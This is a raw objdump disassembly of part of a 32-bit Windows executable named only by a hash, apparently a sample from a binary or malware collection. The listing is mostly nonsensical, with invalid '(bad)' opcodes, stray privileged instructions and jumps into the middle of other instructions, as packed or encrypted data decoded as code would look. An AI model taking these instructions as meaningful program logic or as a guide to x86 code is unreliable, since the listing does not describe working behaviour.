
61874fcb33b0150e423f34e45f6f8deb89c1cef096b3a01984554c91a49c4841.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   eax
  411001:	fistp  WORD PTR [edi-0x25]
  411004:	lahf   
  411005:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  411007:	push   ss
  411008:	dec    esp
  411009:	add    ebx,0xffffffba
  41100c:	leave  
  41100d:	shl    BYTE PTR [edi+0x6122e401],1
  411013:	cmovl  edi,DWORD PTR [esi-0x2f]
  411017:	xchg   edx,eax
  411018:	add    edi,edx
  41101a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41101b:	out    0x4f,eax
  41101d:	sub    eax,0xe9d3f7
  411022:	scas   eax,DWORD PTR es:[edi]
  411023:	jge    0x411045
  411025:	xor    esi,DWORD PTR [ecx-0x12]
  411028:	and    eax,0xb546a01f
  41102d:	mov    ?,WORD PTR [ecx]
  41102f:	push   0x3d442d24
  411034:	pop    ebp
  411035:	fidiv  WORD PTR [edi+0x7e]
  411038:	scas   eax,DWORD PTR es:[edi]
  411039:	(bad)  
  41103a:	aas    
  41103b:	mov    ebp,0x6982d535
  411040:	add    al,0x6e
  411042:	mov    dl,0x6b
  411044:	mov    ecx,0xef175b5e
  411049:	lea    ebx,[ebp+0x58]
  41104c:	popf   
  41104d:	pop    esp
  41104e:	mov    DWORD PTR [esi],ebp
  411050:	xor    BYTE PTR [edi+0x57],0xbe
  411054:	je     0x41104a
  411056:	sbb    BYTE PTR [edi-0x5ccc79f7],dl
  41105c:	fisttp QWORD PTR [eax+0x1d8c67ed]
  411062:	popf   
  411063:	jp     0x411018
  411065:	xchg   DWORD PTR [edi],eax
  411067:	fisubr WORD PTR [edx]
  411069:	aam    0x5
  41106b:	in     al,0x31
  41106d:	shl    edx,1
  41106f:	and    al,0xed
  411071:	adc    DWORD PTR [edx+0x4],esp
  411074:	cmp    DWORD PTR [ebx-0x135f297f],esi
  41107a:	(bad)  
  41107b:	jb     0x4110dc
  41107d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41107e:	pop    ebp
  41107f:	pop    eax
  411080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411081:	int    0x7c
  411083:	jo     0x41103f
  411085:	into   
  411086:	pop    edi
  411087:	clc    
  411088:	push   ebp
  411089:	inc    edx
  41108a:	add    eax,0x984950fd
  41108f:	gs test eax,0xa130bf7b
  411095:	mov    dh,0x5c
  411097:	lea    eax,[ecx]
  411099:	sbb    al,0x49
  41109b:	addr16 push es
  41109d:	push   ebp
  41109e:	(bad)  
  41109f:	jl     0x41109d
  4110a1:	es mov edx,0x691d9b8d
  4110a7:	pop    eax
  4110a8:	stos   BYTE PTR es:[edi],al
  4110a9:	sub    al,0x18
  4110ab:	popa   
  4110ac:	std    
  4110ad:	inc    esi
  4110ae:	gs (bad) 
  4110b0:	shl    al,1
  4110b2:	inc    edi
  4110b3:	in     eax,0x13
  4110b5:	cli    
  4110b6:	mov    edi,?
  4110b8:	sti    
  4110b9:	mov    al,ds:0xb8dfe945
  4110be:	cld    
  4110bf:	loope  0x411131
  4110c1:	in     al,dx
  4110c2:	pop    es
  4110c3:	ret    0xb116
  4110c6:	add    ebx,DWORD PTR [ebx]
  4110c8:	dec    esp
  4110c9:	mov    ch,0xe3
  4110cb:	mov    eax,0x6c4efe27
  4110d0:	imul   esp,ebp,0x96d8d973
  4110d6:	xor    BYTE PTR [edi-0x24],dl
  4110d9:	out    dx,al
  4110da:	into   
  4110db:	mov    edx,0xcf653f59
  4110e0:	xlat   BYTE PTR ds:[ebx]
  4110e1:	sbb    bh,bl
  4110e3:	lahf   
  4110e4:	shl    DWORD PTR [ecx+0x3e346a0f],0x80
  4110eb:	inc    esp
  4110ec:	dec    ecx
  4110ed:	mov    bh,0xba
  4110ef:	aaa    
  4110f0:	ficomp DWORD PTR [edi]
  4110f2:	inc    eax
  4110f3:	cmp    BYTE PTR [edi+0x7e],bh
  4110f6:	aas    
  4110f7:	mov    al,ds:0xecc1f008
  4110fc:	(bad)  
  4110fd:	shl    DWORD PTR [ecx-0x7b],0xba
  411101:	cdq    
  411102:	fisub  DWORD PTR [edi]
  411104:	outs   dx,BYTE PTR ds:[esi]
  411105:	stos   BYTE PTR es:[edi],al
  411106:	jmp    0xa2a2073b
  41110b:	fcom   DWORD PTR [eax-0x6f40eee9]
  411111:	push   esp
  411112:	inc    edi
  411113:	cmp    DWORD PTR [ebx+0x3294015],edx
  411119:	aad    0x78
  41111b:	rcr    BYTE PTR fs:[edi+0x1],0xd8
  411120:	leave  
  411121:	gs test ebx,0xc310c123
  411128:	loop   0x411174
  41112a:	inc    ecx
  41112b:	pusha  
  41112c:	lods   al,BYTE PTR ds:[esi]
  41112d:	aam    0x6e
  41112f:	add    DWORD PTR fs:[esi-0x7],0xffffff8f
  411134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411135:	and    esp,DWORD PTR [eax-0x9]
  411138:	rcr    DWORD PTR [esi-0x45],1
  41113b:	mov    ch,0x4e
  41113d:	sbb    al,BYTE PTR [eax+0x1295c0]
  411143:	shl    ah,cl
  411145:	imul   eax,ebx,0x67
  411148:	in     eax,dx
  411149:	pop    esi
  41114a:	and    al,0xef
  41114c:	bound  esp,QWORD PTR [ecx+0x3bfcb77b]
  411152:	mov    fs,WORD PTR [ebp-0x10]
  411155:	dec    esi
  411156:	push   es
  411157:	add    bh,BYTE PTR [edx]
  411159:	mov    ?,WORD PTR [ecx-0x7b]
  41115c:	or     cl,BYTE PTR [ebp+eax*1+0x35]
  411160:	test   al,0x87
  411162:	add    eax,edx
  411164:	push   ss
  411165:	in     eax,dx
  411166:	mov    bh,BYTE PTR [ebx-0x1eeccfe]
  41116c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41116d:	mov    eax,ds:0xc10145ca
  411172:	test   al,0x35
  411174:	das    
  411175:	mov    WORD PTR [ebp+0x80cc3b2],?
  41117b:	pop    ecx
  41117c:	repnz mov BYTE PTR [ebx],cl
  41117f:	daa    
  411180:	test   BYTE PTR [eax+0x4c7089c5],bh
  411186:	push   edx
  411187:	lods   al,BYTE PTR ds:[esi]
  411188:	sub    edi,ebp
  41118a:	dec    ebp
  41118b:	shl    BYTE PTR [eax+0x2e6df3a1],0xfc
  411192:	dec    eax
  411193:	jb     0x41114d
  411195:	add    DWORD PTR [edi+edx*2+0x46],0xffffffa9
  41119a:	jns    0x4111a9
  41119c:	xor    ebp,ebp
  41119e:	push   cs
  41119f:	cmp    BYTE PTR [esi],bh
  4111a1:	pop    ds
  4111a2:	push   0xffffff88
  4111a4:	xlat   BYTE PTR ds:[ebx]
  4111a5:	jmp    0x411152
  4111a7:	repz repz inc ebx
  4111aa:	lgs    ebx,FWORD PTR [edi]
  4111ad:	ja     0x4111fe
  4111af:	jne    0x4111f9
  4111b1:	out    0x12,al
  4111b3:	int3   
  4111b4:	mov    ebx,0x5977ea52
  4111b9:	scas   al,BYTE PTR es:[edi]
  4111ba:	mov    dl,0x33
  4111bc:	pop    ebp
  4111bd:	aaa    
  4111be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111bf:	clc    
  4111c0:	test   al,0xdc
  4111c2:	outs   dx,DWORD PTR ds:[esi]
  4111c3:	jg     0x411159
  4111c5:	sbb    ecx,DWORD PTR [edx+0x5012270c]
  4111cb:	fcmovb st,st(5)
  4111cd:	das    
  4111ce:	dec    esp
  4111cf:	jnp    0x4111d0
  4111d1:	add    ecx,DWORD PTR [edx+0x5ce357c5]
  4111d7:	jae    0x411160
  4111d9:	int3   
  4111da:	dec    ebx
  4111db:	jmp    0x41119d
  4111dd:	adc    DWORD PTR [edi],edi
  4111df:	mov    ds:0xd7e9a00e,eax
  4111e4:	aas    
  4111e5:	imul   ecx,DWORD PTR [edx-0xf1b5cfe],0xfffffff1
  4111ec:	shr    DWORD PTR [esi],0x98
  4111ef:	xor    eax,0x425cdc90
  4111f4:	js     0x4111d0
  4111f6:	mov    edi,0xb72e3859
  4111fb:	out    0xd3,eax
  4111fd:	add    dh,0x57
  411200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411201:	ret    
  411202:	shr    DWORD PTR [ebx-0x48],1
  411205:	pop    DWORD PTR [ebx+0x55b0880f]
  41120b:	cmp    DWORD PTR [edi-0x1fb465d0],0x62
  411212:	in     al,0xed
  411214:	cli    
  411215:	inc    esp
  411216:	or     al,0xf2
  411218:	and    dl,BYTE PTR [edx]
  41121a:	and    DWORD PTR [edx+0x6fbc88bc],ecx
  411220:	mov    ds:0xaa7043d9,al
  411225:	fcmovne st,st(7)
  411227:	cmp    dh,BYTE PTR [bx+si+0x1fcf]
  41122c:	jns    0x41128f
  41122e:	sar    al,cl
  411230:	xor    DWORD PTR [esi],esi
  411232:	mov    ebp,0xf7227284
  411237:	icebp  
  411238:	stos   DWORD PTR es:[edi],eax
  411239:	add    edx,esi
  41123b:	dec    ecx
  41123c:	cmp    ebp,DWORD PTR [edx+0x32]
  41123f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411240:	test   BYTE PTR [ecx+0x60],0x2e
  411244:	mov    dh,cl
  411246:	jbe    0x4111fc
  411248:	adc    eax,0x1291778f
  41124d:	mov    esi,gs
  41124f:	push   edx
  411250:	mov    ebp,0x56c79903
  411255:	icebp  
  411256:	xchg   DWORD PTR [edi+0x7b],eax
  411259:	mov    bl,0xee
  41125b:	pop    ecx
  41125c:	lds    edx,FWORD PTR [ecx+ecx*1]
  41125f:	cmp    eax,0x1f6b2475
  411264:	clc    
  411265:	push   ebp
  411266:	and    al,bh
  411268:	mov    bl,0x4c
  41126a:	loop   0x4112b8
  41126c:	cld    
  41126d:	mov    eax,0x752d892f
  411272:	cdq    
  411273:	mov    es,edx
  411275:	inc    edi
  411276:	or     eax,0x4bfc288c
  41127b:	test   BYTE PTR [eax-0x15],ch
  41127e:	shl    BYTE PTR [esp+eax*1-0x46],cl
  411282:	or     ch,BYTE PTR [ebx+eax*1+0x1930d4e3]
  411289:	ret    0xff3b
  41128c:	pushf  
  41128d:	lahf   
  41128e:	xchg   BYTE PTR [ecx+0x90b60e],ch
  411294:	ins    BYTE PTR es:[edi],dx
  411295:	mov    ebx,0x9656a55
  41129a:	(bad)  
  41129b:	jmp    0x3789ce4f
  4112a0:	jae    0x4112b1
  4112a2:	imul   ecx,eax,0xffffff92
  4112a5:	mov    ecx,esp
  4112a7:	std    
  4112a8:	js     0x41127a
  4112aa:	xorps  xmm2,XMMWORD PTR [edx-0x770b84b5]
  4112b1:	jb     0x411268
  4112b3:	cmp    al,BYTE PTR ds:0x21f2093f
  4112b9:	popf   
  4112ba:	mov    ds:0x51634df4,eax
  4112bf:	jb     0x411336
  4112c1:	cwde   
  4112c2:	push   ds
  4112c3:	aad    0x70
  4112c5:	daa    
  4112c6:	push   ecx
  4112c7:	jmp    0x41131b
  4112c9:	shl    DWORD PTR [eax],cl
  4112cb:	lods   ax,WORD PTR ds:[esi]
  4112cd:	(bad)  
  4112ce:	push   esp
  4112cf:	in     eax,dx
  4112d0:	pop    ebp
  4112d1:	(bad)  
  4112d2:	in     al,0xb0
  4112d4:	(bad)  
  4112d5:	add    BYTE PTR [edi],ch
  4112d7:	xor    BYTE PTR [ebx-0x29f7b463],al
  4112dd:	pop    ecx
  4112de:	and    DWORD PTR [eax+0x65932478],0x5ecd54a6
  4112e8:	ss scas eax,DWORD PTR es:[edi]
  4112ea:	fistp  QWORD PTR [ebx+0x44]
  4112ed:	cmp    ch,BYTE PTR [esi]
  4112ef:	jb     0x41127d
  4112f1:	pop    edx
  4112f2:	inc    esi
  4112f3:	jbe    0x41130f
  4112f5:	dec    ebx
  4112f6:	icebp  
  4112f7:	leave  
  4112f8:	xlat   BYTE PTR ds:[ebx]
  4112f9:	xchg   DWORD PTR ds:0xcec9,ebp
  4112fe:	push   eax
  4112ff:	ds adc al,0x85
  411302:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  411304:	ins    BYTE PTR es:[edi],dx
  411305:	mov    ds:0x5b209c3,al
  41130a:	fs leave 
  41130c:	dec    ebx
  41130d:	(bad)  
  41130e:	push   ecx
  41130f:	test   eax,0xd6668cf3
  411314:	push   es
  411315:	lds    edx,FWORD PTR [edx+0x2e]
  411318:	cmc    
  411319:	pop    ds
  41131a:	lods   al,BYTE PTR ds:[esi]
  41131b:	cld    
  41131c:	popf   
  41131d:	mov    cl,BYTE PTR [esi]
  41131f:	iret   
  411320:	ja     0x4112b5
  411322:	scas   eax,DWORD PTR es:[edi]
  411323:	out    dx,eax
  411324:	mov    ds:0x336f52fa,al
  411329:	push   cs
  41132a:	xchg   DWORD PTR [ebp-0x649b7348],esi
  411330:	xchg   edi,eax
  411331:	xchg   BYTE PTR [ebx+esi*8],al
  411334:	pop    eax
  411335:	xchg   esp,eax
  411336:	popa   
  411337:	jl     0x4112c2
  411339:	xchg   eax,edi
  41133b:	pop    esp
  41133c:	inc    ebp
  41133d:	sub    eax,0xc4c8226e
  411342:	cdq    
  411343:	lods   eax,DWORD PTR ds:[esi]
  411344:	pop    ss
  411345:	sbb    al,0x2
  411347:	adc    edx,0xc950f5b8
  41134d:	mov    esi,0x7bc007
  411352:	lods   al,BYTE PTR ds:[esi]
  411353:	and    WORD PTR [esi],0x30
  411357:	mov    esp,DWORD PTR [edx-0x25]
  41135a:	xchg   BYTE PTR [ebp-0x3f09e526],bl
  411360:	rcl    BYTE PTR [esi],cl
  411362:	adc    DWORD PTR ds:0xbb9e9d27,0xffffff95
  411369:	xchg   ecx,eax
  41136a:	loopne 0x4113d6
  41136c:	adc    ebp,DWORD PTR [ebx+edi*2-0x31]
  411370:	sbb    esp,DWORD PTR cs:0x5bd963bb
  411377:	mov    edi,0x5be6e080
  41137c:	and    eax,0x63a335d5
  411381:	arpl   WORD PTR [eax],bx
  411383:	rcl    DWORD PTR [edx-0x74],0xd
  411387:	icebp  
  411388:	jmp    0x411317
  41138a:	bound  ecx,QWORD PTR [edi+edx*1]
  41138d:	pop    esp
  41138e:	fimul  DWORD PTR [ebp+0x37e8177]
  411394:	jbe    0x411359
  411396:	ja     0x41133c
  411398:	(bad)  
  411399:	or     esp,DWORD PTR [edi+0x5]
  41139c:	or     bh,BYTE PTR [ebx-0x25]
  41139f:	mov    eax,ds:0xd7dccde8
  4113a4:	push   0x73
  4113a6:	pop    ss
  4113a7:	xchg   ecx,eax
  4113a8:	push   ss
  4113a9:	add    BYTE PTR [eax+0x2fd6b958],al
  4113af:	adc    al,0x8
  4113b1:	pushf  
  4113b2:	sbb    BYTE PTR [ebx],ah
  4113b4:	inc    ecx
  4113b5:	ficom  DWORD PTR ds:0xbd29f9c8
  4113bb:	push   edi
  4113bc:	dec    edi
  4113bd:	mov    eax,ds:0xdf9a1f7c
  4113c2:	fndisi(8087 only) 
  4113c4:	push   0x5f
  4113c6:	push   cs
  4113c7:	mov    esp,0xc27cc6e1
  4113cc:	sbb    al,0xd0
  4113ce:	aas    
  4113cf:	hlt    
  4113d0:	icebp  
  4113d1:	push   esp
  4113d2:	fstp   QWORD PTR [ebx-0x292a1928]
  4113d8:	adc    ah,bh
  4113da:	pop    ebp
  4113db:	shl    BYTE PTR [eax],0x99
  4113de:	ins    DWORD PTR es:[edi],dx
  4113df:	mov    ebx,DWORD PTR [edx+0x7a672006]
  4113e5:	mov    dh,0x7
  4113e7:	outs   dx,BYTE PTR ds:[esi]
  4113e8:	and    BYTE PTR [eax],bl
  4113ea:	cmc    
  4113eb:	sahf   
  4113ec:	xchg   ebp,eax
  4113ed:	cmp    eax,0x607c773f
  4113f2:	nop
  4113f3:	fld    DWORD PTR [ebx-0x3]
  4113f6:	leave  
  4113f7:	xor    ah,ch
  4113f9:	push   ds
  4113fa:	aas    
  4113fb:	and    eax,0xb95a1b99
  411400:	inc    ebp
  411401:	add    eax,0xf32fc03f
  411406:	fidivr WORD PTR ds:0xa3fc046d
  41140c:	ins    DWORD PTR es:[edi],dx
  41140d:	sbb    esp,edi
  41140f:	mov    dl,0x7d
  411411:	fidiv  DWORD PTR [edx-0x35125fe6]
  411417:	cmp    BYTE PTR [edi+0x6c],0x28
  41141b:	int    0x88
  41141d:	cmp    bh,dh
  41141f:	enter  0xeab1,0x4d
  411423:	inc    esi
  411424:	inc    ebp
  411425:	push   ecx
  411426:	push   edx
  411427:	dec    ecx
  411428:	shl    BYTE PTR [esi+0x40],1
  41142b:	aas    
  41142c:	loopne 0x41145c
  41142e:	sub    eax,DWORD PTR [ecx]
  411430:	pop    esp
  411431:	jecxz  0x411482
  411433:	shl    BYTE PTR ds:0xe793304,0xeb
  41143a:	(bad)  [ebx+0x40]
  41143d:	addr16 aad 0xaa
  411440:	hlt    
  411441:	(bad)  
  411442:	lds    esi,FWORD PTR [ebx+0x1a]
  411445:	cmc    
  411446:	mov    ch,0x17
  411448:	arpl   WORD PTR [eax+0x3e],bx
  41144b:	aad    0xa3
  41144d:	cmp    DWORD PTR [edx+0x2bdd7fc0],0xffffff9b
  411454:	ret    0xf991
  411457:	out    0x28,al
  411459:	mov    dh,0x81
  41145b:	loop   0x411481
  41145d:	mov    cl,0xf1
  41145f:	idiv   DWORD PTR [edi+0x6f]
  411462:	cs dec ecx
  411464:	pop    eax
  411465:	xor    BYTE PTR [ebx+0x69],ch
  411468:	stos   BYTE PTR es:[edi],al
  411469:	test   BYTE PTR [edx-0x26],bl
  41146c:	pop    ecx
  41146d:	out    dx,al
  41146e:	add    eax,0x7499c29a
  411473:	sub    DWORD PTR [ebx],edi
  411475:	sub    al,0xa2
  411477:	or     eax,0x46c3a795
  41147c:	retf   0x7b60
  41147f:	cld    
  411480:	stos   BYTE PTR es:[edi],al
  411481:	jno    0x411501
  411483:	stos   BYTE PTR es:[edi],al
  411484:	int    0xd2
  411486:	add    eax,0x25581fd4
  41148b:	test   ah,cl
  41148d:	cmp    BYTE PTR [eax+0x7cc9c],0x6c
  411494:	inc    esp
  411495:	inc    ecx
  411496:	ds push ds
  411498:	ret    0x72de
  41149b:	lods   al,BYTE PTR ds:[esi]
  41149c:	mov    ebp,0x3b2a86ab
  4114a1:	xchg   esp,eax
  4114a2:	bound  esi,QWORD PTR [ebx-0x7c]
  4114a5:	ss sub al,0xb5
  4114a8:	sbb    BYTE PTR [edx+ecx*2+0x7b36829f],bl
  4114af:	(bad)  
  4114b0:	sbb    DWORD PTR [edx-0x42],ebp
  4114b3:	pop    ss
  4114b4:	test   al,0x81
  4114b6:	fimul  WORD PTR [esi-0xf]
  4114b9:	(bad)  [edi]
  4114bb:	push   ebp
  4114bc:	mov    dl,0x33
  4114be:	adc    edx,DWORD PTR [edi+ecx*2]
  4114c1:	pop    esi
  4114c2:	not    BYTE PTR [edx-0x48]
  4114c5:	mov    ch,0x5d
  4114c7:	and    dh,BYTE PTR [esi+0x47]
  4114ca:	xor    eax,eax
  4114cc:	retf   0xcddc
  4114cf:	adc    al,0x2d
  4114d1:	scas   eax,DWORD PTR es:[edi]
  4114d2:	or     eax,DWORD PTR [edx+eiz*1]
  4114d5:	pop    edx
  4114d6:	cld    
  4114d7:	or     BYTE PTR [ebx+0x59075589],dl
  4114dd:	push   cs
  4114de:	aam    0x1e
  4114e0:	pop    ecx
  4114e1:	out    0xbb,eax
  4114e3:	fsub   DWORD PTR [edi+ecx*1]
  4114e6:	xchg   esi,eax
  4114e7:	mov    bl,0x12
  4114e9:	fsubr  st,st(0)
  4114eb:	ins    BYTE PTR es:[edi],dx
  4114ec:	shl    BYTE PTR [eax-0x1b996a51],1
  4114f2:	or     BYTE PTR [esi+0x11],dl
  4114f5:	into   
  4114f6:	cwde   
  4114f7:	mov    dh,0xef
  4114f9:	inc    ebp
  4114fa:	ss ss in al,0x1f
  4114fe:	or     edi,DWORD PTR [edi+edx*4]
  411501:	ds scas al,BYTE PTR es:[edi]
  411503:	pop    edi
  411504:	xlat   BYTE PTR ds:[ebx]
  411505:	pop    ss
  411506:	neg    DWORD PTR [ebx+0xd]
  411509:	imul   edx,DWORD PTR [ebx-0x717ca7ad],0x62
  411510:	cmp    esi,ecx
  411512:	iret   
  411513:	xor    DWORD PTR [ecx-0x36],0xfffffff8
  411517:	push   0xffffffb6
  411519:	push   ecx
  41151a:	xor    BYTE PTR [eax+ebx*8],al
  41151d:	xchg   edx,eax
  41151e:	adc    BYTE PTR [edi-0x59],0xf4
  411522:	ucomiss xmm5,xmm6
  411525:	into   
  411526:	pop    edi
  411527:	push   ss
  411528:	mov    bl,0x1b
  41152a:	pop    edx
  41152b:	jg     0x41151f
  41152d:	or     ch,dl
  41152f:	sbb    BYTE PTR [edi+eiz*1+0x3b3ff3f8],al
  411536:	inc    esi
  411537:	xor    eax,esp
  411539:	loope  0x411592
  41153b:	out    0x11,al
  41153d:	dec    edx
  41153e:	stos   BYTE PTR es:[edi],al
  41153f:	call   0x3721c5ec
  411544:	(bad)  
  411545:	jns    0x411514
  411547:	popa   
  411548:	adc    BYTE PTR [ebp-0x78],dh
  41154b:	adc    al,0xbd
  41154d:	cmp    al,0xaf
  41154f:	sahf   
  411550:	pop    ecx
  411551:	add    DWORD PTR [esi+0x28],eax
  411554:	sbb    DWORD PTR ds:0xc7ae9f33,esi
  41155a:	mov    ds:0x5ecdecdf,al
  41155f:	lods   eax,DWORD PTR ds:[esi]
  411560:	out    0xa9,al
  411562:	cli    
  411563:	and    ah,0x9a
  411566:	outs   dx,DWORD PTR ds:[esi]
  411567:	jno    0x411500
  411569:	jnp    0x4115a7
  41156b:	arpl   WORD PTR [eax],sp
  41156d:	mov    edx,0x4923e2af
  411572:	add    ah,0xb5
  411575:	pop    edi
  411576:	in     ax,dx
  411578:	pop    edi
  411579:	shr    BYTE PTR [edi+ebp*1+0x4d880a1],1
  411580:	mov    al,0xc5
  411582:	data16 in al,0x3f
  411585:	sbb    al,al
  411587:	lock or al,0xd3
  41158a:	jl     0x411596
  41158c:	fldcw  WORD PTR [eax-0x67]
  411590:	ins    BYTE PTR es:[edi],dx
  411591:	adc    ebx,DWORD PTR [edx+0x43306917]
  411597:	call   0xa60c:0xf8d82f24
  41159e:	cmp    eax,0x719bbb86
  4115a3:	sub    ah,BYTE PTR [eax]
  4115a5:	sahf   
  4115a6:	jl     0x41156e
  4115a8:	cmp    ebp,DWORD PTR [edi]
  4115aa:	inc    edi
  4115ab:	dec    ebx
  4115ac:	out    dx,eax
  4115ad:	adc    al,0xb8
  4115af:	inc    ecx
  4115b0:	std    
  4115b1:	xor    BYTE PTR [eax-0x1],al
  4115b4:	stos   BYTE PTR es:[edi],al
  4115b5:	mov    ah,0xcd
  4115b7:	ss push es
  4115b9:	fmul   DWORD PTR [esi+0x24]
  4115bc:	push   ebp
  4115bd:	mov    cl,0x9d
  4115bf:	fs pop ecx
  4115c1:	call   0x38230e1
  4115c6:	out    dx,eax
  4115c7:	cmc    
  4115c8:	xchg   esp,eax
  4115c9:	pop    esp
  4115ca:	inc    ebp
  4115cb:	cmp    al,0x48
  4115cd:	mov    cl,0x3a
  4115cf:	nop
  4115d0:	loopne 0x41160b
  4115d2:	sti    
  4115d3:	loopne 0x41159f
  4115d5:	push   edx
  4115d6:	mov    cl,0xc8
  4115d8:	add    edx,ebx
  4115da:	fild   DWORD PTR [ebp-0x72c39871]
  4115e0:	call   0xd0b9b420
  4115e5:	sub    bl,BYTE PTR [edx+0x3f]
  4115e8:	dec    ebx
  4115e9:	popf   
  4115ea:	inc    eax
  4115eb:	div    DWORD PTR [edi-0x17]
  4115ee:	iret   
  4115ef:	loopne 0x411593
  4115f1:	outs   dx,DWORD PTR ds:[esi]
  4115f2:	cmp    BYTE PTR [ecx-0x5a3e3350],ah
  4115f8:	pop    ebp
  4115f9:	adc    DWORD PTR [esi],ebp
  4115fb:	ins    DWORD PTR es:[edi],dx
  4115fc:	ins    DWORD PTR es:[edi],dx
  4115fd:	dec    esp
  4115fe:	add    edi,DWORD PTR [ebp+0x4d]
  411601:	cld    
  411602:	(bad)  
  411604:	(bad)  
  411605:	cli    
  411606:	push   esp
  411607:	push   es
  411608:	imul   esp,esp,0xffffff83
  41160b:	dec    ebp
  41160c:	add    eax,0x2571194f
  411611:	pop    es
  411612:	mov    esp,0x8c98b99e
  411617:	jecxz  0x411678
  411619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41161a:	sbb    DWORD PTR [ecx*2+0x76c73e9e],0xffffffff
  411622:	sahf   
  411623:	loopne 0x41163e
  411625:	sub    al,0x74
  411627:	adc    eax,0xc3942608
  41162c:	push   0x5e322d3a
  411631:	jb     0x411697
  411633:	xor    ebp,eax
  411635:	jnp    0x411605
  411637:	push   ecx
  411638:	fimul  WORD PTR [edi+edi*4-0x42]
  41163c:	cmp    al,0x11
  41163e:	adc    edx,DWORD PTR ds:0xceb45e17
  411644:	adc    DWORD PTR [edx+0x3f],ecx
  411647:	mov    edi,0xefd6a21f
  41164c:	pop    ecx
  41164d:	or     DWORD PTR [ecx],esp
  41164f:	sbb    al,0xa4
  411651:	adc    esi,edx
  411653:	adc    ch,BYTE PTR [esp+edi*8+0x5a1d03c2]
  41165a:	aaa    
  41165b:	mov    DWORD PTR [edx-0x3f97be96],ebx
  411661:	ds inc esp
  411663:	inc    edi
  411664:	push   cs
  411665:	test   al,0x4c
  411667:	fld    TBYTE PTR [ebx-0x12bb49ce]
  41166d:	icebp  
  41166e:	xchg   DWORD PTR ds:[esi+0x8607c9],esi
  411675:	push   cs
  411676:	inc    edi
  411677:	(bad)  
  411678:	pop    edi
  411679:	mov    edx,0x87ac9d69
  41167e:	fs fdivrp st(7),st
  411681:	inc    edx
  411682:	inc    esi
  411683:	sub    BYTE PTR [ebp+0x26],0xec
  411687:	adc    bh,BYTE PTR [ebx]
  411689:	dec    esp
  41168a:	arpl   WORD PTR [esi],di
  41168c:	pop    ss
  41168d:	test   eax,0xd9d4d4db
  411692:	icebp  
  411693:	pop    eax
  411694:	jns    0x411625
  411696:	xor    al,BYTE PTR [eax+0x4]
  411699:	jl     0x41168a
  41169b:	and    eax,0xa08f646f
  4116a0:	mov    BYTE PTR [eax-0x68],ch
  4116a3:	call   0xf51b1e49
  4116a8:	pop    edi
  4116a9:	rcl    BYTE PTR [ebx],0xdb
  4116ac:	dec    ebp
  4116ad:	ins    DWORD PTR es:[edi],dx
  4116ae:	lods   eax,DWORD PTR ds:[esi]
  4116af:	sbb    dl,dl
  4116b1:	mov    ecx,0x6a69f375
  4116b6:	push   es
  4116b7:	(bad)  
  4116b8:	cmc    
  4116b9:	popa   
  4116ba:	adc    eax,0x2dc4765e
  4116bf:	jne    0x411734
  4116c1:	mov    ebp,0x3427e431
  4116c6:	xchg   ecx,eax
  4116c7:	fnstcw WORD PTR [ebx+0x3ee1cacb]
  4116cd:	popa   
  4116ce:	or     eax,DWORD PTR [edx+0x7f]
  4116d1:	out    0xfb,al
  4116d3:	fdivp  st(2),st
  4116d5:	or     al,0x22
  4116d7:	jmp    0x4116cb
  4116d9:	dec    ebx
  4116da:	sar    BYTE PTR [ecx+0x73],0x1a
  4116de:	mov    bh,0x67
  4116e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e1:	or     bh,BYTE PTR [edx]
  4116e3:	jecxz  0x4116ef
  4116e5:	inc    esi
  4116e6:	push   esp
  4116e7:	shr    BYTE PTR [ecx-0x7badf5cb],1
  4116ed:	dec    ebx
  4116ef:	call   0x22a7321b
  4116f4:	mov    ds:0x230217e5,al
  4116f9:	sbb    DWORD PTR [edx+0x4b4b20f],esi
  4116ff:	les    esi,FWORD PTR [edi]
  411701:	aam    0x61
  411703:	cmp    DWORD PTR [esi+0x38e0fea2],0x3f
  41170a:	adc    ah,BYTE PTR [ebx+0x68]
  41170d:	dec    ecx
  41170e:	mov    ch,0xda
  411710:	mov    eax,0x79e827ca
  411715:	mov    ebx,0x5d1dc9f6
  41171a:	and    DWORD PTR [eax],0x28
  41171d:	push   edx
  41171e:	cli    
  41171f:	enter  0x2cc,0x63
  411723:	retf   0xb4b8
  411726:	adc    al,0xf8
  411728:	dec    ebp
  411729:	adc    eax,0xa13e4511
  41172e:	out    0x75,eax
  411730:	out    0x70,eax
  411732:	out    dx,eax
  411733:	call   0x6c11:0x622746f
  41173a:	push   es
  41173b:	pop    DWORD PTR [ecx+0x51a0ed7f]
  411741:	jb     0x4117ab
  411743:	jno    0x4116f9
  411745:	rcl    BYTE PTR [eax+edx*2],1
  411748:	gs pusha 
  41174a:	add    DWORD PTR es:[ebx-0xd],0xba698db
  411752:	ins    BYTE PTR es:[edi],dx
  411753:	ss cmp ecx,ebx
  411756:	mov    edi,0xb3cda4a5
  41175b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41175c:	fisttp WORD PTR [eax+0x4d]
  41175f:	pop    eax
  411760:	or     eax,0x4032e736
  411765:	push   ecx
  411766:	sbb    eax,0xca4a5664
  41176b:	fnstenv [ecx-0x77]
  41176e:	(bad)  
  41176f:	mov    al,0x6d
  411771:	pusha  
  411772:	imul   DWORD PTR [edi]
  411774:	dec    edx
  411775:	and    al,0x2e
  411777:	mov    al,0x7b
  411779:	call   0xb99b:0xfe080c5d
  411780:	fadd   st(0),st
  411782:	icebp  
  411783:	scas   al,BYTE PTR es:[edi]
  411784:	sbb    DWORD PTR [ebp-0x1a],ebx
  411787:	ds push 0xfffffffb
  41178a:	push   ebx
  41178b:	xor    al,BYTE PTR [ecx]
  41178d:	bound  esp,QWORD PTR [ebx+0x7071b9e3]
  411793:	inc    esp
  411794:	test   eax,0x409da55e
  411799:	cmp    al,bl
  41179b:	test   BYTE PTR [edx+0x75],0x9d
